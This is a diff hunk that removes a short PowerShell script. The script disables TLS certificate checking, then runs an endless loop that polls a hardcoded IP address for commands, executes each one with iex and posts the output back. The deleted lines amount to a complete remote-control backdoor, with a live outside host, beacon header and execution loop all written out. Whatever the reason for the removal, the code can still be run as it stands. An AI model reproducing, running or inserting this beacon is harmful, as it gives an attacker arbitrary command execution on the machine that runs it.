@@ -1,7 +1,0 @@
-add-type @"
-using System.Net;using System.Security.Cryptography.X509Certificates;
-public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
-ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
-"@
-[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-$s='16.52.159.115:443';$i='47275e51-cbf2b623-c8d3f121';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/47275e51 -Headers @{"X-e790-c976"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/cbf2b623 -Headers @{"X-e790-c976"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/c8d3f121 -Method POST -Headers @{"X-e790-c976"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
